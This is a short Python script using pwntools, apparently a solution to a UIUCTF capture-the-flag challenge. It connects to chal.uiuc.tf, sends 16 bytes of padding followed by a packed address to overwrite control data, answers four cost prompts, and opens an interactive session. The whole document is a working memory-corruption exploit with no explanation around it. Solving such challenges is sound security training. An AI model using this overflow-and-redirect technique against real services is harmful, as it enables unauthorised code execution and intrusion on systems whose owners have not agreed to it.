from pwn import *

###Exploit
r = remote('chal.uiuc.tf',2001)

r.sendafter('Item: ',b'a'*0x10+p64(0x8048878))
r.sendlineafter('Cost: ','26')
r.sendlineafter('Cost: ','27')
r.sendlineafter('Cost: ','24')
r.sendlineafter('Cost: ','23')
r.interactive()
